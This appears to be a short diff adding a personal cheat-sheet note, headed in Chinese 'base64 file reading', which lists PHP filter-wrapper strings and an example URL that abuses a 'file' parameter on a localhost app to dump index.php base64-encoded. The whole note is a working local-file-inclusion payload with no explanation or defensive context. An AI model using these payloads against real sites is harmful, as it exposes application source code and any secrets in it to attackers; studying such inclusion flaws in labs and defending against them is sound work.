@@ -1,0 +1,7 @@
+## base64 讀檔
+
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index
+
+e.g.
+http://localhost:8888/?file=php://filter/read=convert.base64-encode/resource=index.php
